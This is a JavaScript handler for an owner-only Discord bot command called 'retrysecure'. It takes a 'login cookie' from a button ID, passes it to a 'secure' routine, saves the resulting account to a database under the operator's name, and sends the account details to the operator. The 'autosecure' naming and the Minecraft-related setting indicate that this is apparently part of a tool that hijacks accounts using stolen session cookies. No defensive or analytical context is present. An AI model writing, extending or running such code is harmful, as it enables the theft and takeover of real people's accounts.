const { queryParams } = require("../../../db/database")
const listAccount = require("../../utils/accounts/listAccount")
const secure = require("../../utils/secure/recodesecure")
const insertaccount = require("../../../db/insertaccount")
const generateuid = require("../../utils/utils/generateuid")
const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require("discord.js")

module.exports = {
    name: "retrysecure",
    ownerOnly: true,
    callback: async (client, interaction) => {
        let host = interaction.customId.split("|")[1]
        if (!host) {
            return interaction.reply({ content: `Couldn't find the login cookie!`, ephemeral: true })
        }
        if (host.length < 5) {
            return interaction.reply({ content: `Invalid host!`, ephemeral: true })
        }
        
        let settings = await client.queryParams(`SELECT * FROM autosecure WHERE user_id=?`, [client.username])
        if (settings.length == 0) {
            return interaction.reply({
                embeds: [{
                    title: `Error :x:`,
                    description: `Unexpected error occurred!`,
                    color: 0xff0000
                }],
                ephemeral: true
            })
        }
        settings = settings[0]
        await interaction.deferReply({ ephemeral: true })
        try {
            let uid = await generateuid();

            const embed = {
                title: 'This account is being automatically secured.',
                color: 0x808080
            };
            
            const components = [
                new ActionRowBuilder().addComponents(
                    new ButtonBuilder()
                        .setCustomId(`status|${uid}`)
                        .setLabel('⏳ Status')
                        .setStyle(ButtonStyle.Primary)
                )
            ];
            

            await interaction.followUp({ embeds: [embed], components, ephemeral: true });


            await interaction.user.send({ embeds: [embed], components });


            let acc = await secure(host, settings, uid)


              let inserted = await  insertaccount(acc, uid, client.username, settings.secureifnomc)


            let raw = interaction.customId.split("|")[2];
            let parsedUser = JSON.parse(raw);
            console.log(`Got user: ${parsedUser}`)

            let msg = await listAccount(acc, uid, client, parsedUser);
 

            await interaction.followUp(msg);


            await interaction.user.send(msg);
        } catch (e) {
            console.log(`Failed while trying to secure: ${e}`)
            return interaction.editReply({ content: `Failed to secure!`, ephemeral: true })
        }
    }
}
